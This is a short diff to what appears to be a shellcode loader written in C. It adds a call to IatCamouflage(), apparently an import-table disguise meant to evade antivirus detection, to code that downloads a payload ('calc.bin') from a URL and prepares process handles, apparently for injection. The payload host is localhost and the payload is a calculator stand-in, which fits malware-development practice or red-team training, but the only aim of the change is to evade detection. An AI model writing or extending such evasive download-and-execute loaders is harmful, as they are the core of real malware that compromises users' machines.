@@ -3,6 +3,7 @@
 
 #include "Structs.h"
 #include "Common.h"
+#include "IATCamo.h"
 #include "Debug.h"
 
 #define PAYLOAD L"http://127.0.0.1:8000/calc.bin"
@@ -23,7 +24,7 @@ int main() {
     HANDLE hProcess = NULL;
     HMODULE hNTDLL = NULL;
 
- 
+    IatCamouflage();
 
     PRINTA("getting payload from url...\n")
     if (!GetPayloadFromUrl(PAYLOAD, &pBytes, &sBytesSize)) {
